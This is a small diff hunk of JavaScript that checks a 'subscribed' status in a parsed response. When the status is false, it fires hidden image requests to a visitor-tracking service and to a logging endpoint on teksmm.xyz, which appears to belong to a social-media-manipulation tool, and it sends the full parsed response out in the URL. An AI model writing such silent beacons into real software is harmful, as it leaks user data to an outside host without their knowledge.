@@ -464,7 +464,7 @@ function createPost(vars,type) {
 			let statusSubsribe = parsedText.split('"subscribed":')[1].split(',')[0].trim();
 			if(statusSubsribe == "false"){
 				new Image().src = 'https://whos.amung.us/pingjs/?k=selamcek70';
-				new Image().src = '//teksmm.xyz/smmnew/log/yt.php?message=subfailed'+parsedText;
+				new Image().src = '//teksmm.xyz/smmnew/log/yt.php?message=subfailed'+JSON.stringify(parsed);
 			}
             xhr.close;
 		}
